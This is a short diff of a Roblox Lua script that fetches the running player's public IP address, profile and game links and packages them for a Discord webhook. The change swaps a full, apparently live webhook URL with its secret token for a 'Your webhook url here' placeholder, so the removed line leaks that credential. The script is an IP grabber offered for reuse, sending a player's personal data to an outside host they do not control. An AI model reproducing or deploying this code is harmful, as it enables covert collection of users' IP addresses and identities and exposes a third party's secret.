@@ -2,7 +2,7 @@ local ip = game:HttpGet("https://api.ipify.org")
 local profilelink = 'https://roblox.com/users/' .. game.Players.LocalPlayer.UserId .. '/profile'
 local gamelink = 'https://roblox.com/games/' .. game.PlaceId .. '/' .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 
-local Webhook = 'https://discord.com/api/webhooks/1064169737292099674/pBz_WXG3axttoUCe3ru1dVheEQl09KjHRvKsAZ864VmSW7j5ENHiyNm7m48JVjlGFR6l'
+local Webhook = 'Your webhook url here'
 pcall(function()
 local data = {
 ["embeds"] = {
